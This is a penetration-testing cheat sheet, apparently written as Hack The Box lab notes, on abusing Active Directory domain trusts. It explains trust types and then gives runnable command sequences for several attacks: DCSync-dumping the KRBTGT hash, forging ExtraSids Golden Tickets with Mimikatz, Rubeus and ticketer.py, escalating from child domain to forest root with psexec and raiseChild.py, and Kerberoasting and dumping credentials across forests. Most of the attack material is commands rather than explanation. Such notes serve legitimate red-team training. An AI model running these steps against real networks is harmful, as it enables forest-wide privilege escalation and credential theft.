# Domain Trust Abuse

## Trust Types
- **Parent-child**: Two-way transitive trust between parent and child domains in the same forest
- **Cross-link**: Trust between child domains to speed up authentication
- **External**: Non-transitive trust between separate domains in separate forests (uses SID filtering)
- **Tree-root**: Two-way transitive trust between forest root and a new tree root domain
- **Forest**: Transitive trust between two forest root domains

## Trust Direction
- **One-way**: Users in the trusted domain can access resources in the trusting domain, not vice-versa
- **Bidirectional**: Users from both domains can access resources in the other domain
- **Transitive**: Trust extends to objects that the child domain trusts (A trusts B, B trusts C, so A trusts C)
- **Non-transitive**: Only the child domain itself is trusted

## Enumerating Trusts

### PowerShell AD Module
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

### PowerView
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

### netdom
```cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

### BloodHound
- Use pre-built query: "Map Domain Trusts"

### Enumerate users in child domain
```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

## Child -> Parent Trust Abuse (ExtraSids Attack)

### Overview
- Within the same AD forest, the sidHistory property is respected (no SID Filtering)
- We can create a Golden Ticket from the compromised child domain to compromise the parent
- Set sidHistory to Enterprise Admins group SID for full forest access

### Prerequisites
1. KRBTGT hash for the child domain
2. SID for the child domain
3. Name of a target user (does NOT need to exist)
4. FQDN of the child domain
5. SID of the Enterprise Admins group of the root domain

### Gathering Info

#### Get KRBTGT hash (Mimikatz)
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

#### Get child domain SID (PowerView)
```powershell
Get-DomainSID
```

#### Get Enterprise Admins SID
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### From Windows

#### Mimikatz Golden Ticket
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### Rubeus Golden Ticket
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

#### Verify with klist
```
klist
```

#### DCSync the parent domain
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

### From Linux

#### DCSync child domain for KRBTGT hash
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

#### SID brute forcing with lookupsid.py
```bash
# Get child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# Get Enterprise Admins RID from parent domain
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

#### Construct Golden Ticket with ticketer.py
```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

#### Use the ticket
```bash
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

#### Alternative: raiseChild.py (automated)
```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
- Automates the entire child->parent escalation
- Obtains KRBTGT hash, creates Golden Ticket, DCSync parent domain, returns SYSTEM shell

## Cross-Forest Trust Abuse

### Kerberoasting Across Forest Trust
```powershell
# Enumerate SPNs in target forest
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Request TGS ticket for cross-forest SPN
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | Get-DomainSPNTicket -Domain FREIGHTLOGISTICS.LOCAL
```

### From Linux
```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

### Admin Password Reuse
- Check if admin hashes/passwords work across trust boundaries
```bash
secretsdump.py FREIGHTLOGISTICS.LOCAL/administrator@academy-ea-dc03.freightlogistics.local -just-dc-user administrator
```

### Foreign Group Membership
- BloodHound: Check for users from one domain that are members of groups in another domain
- Query: "Find users that belong to groups in another domain"

## SID Filtering
- SID Filtering sanitizes the SID History attribute for cross-forest trusts
- External trusts and cross-forest trusts apply SID Filtering by default
- Intra-forest trusts (parent-child) do NOT apply SID Filtering
- This is why the ExtraSids attack works within a forest but NOT across forests
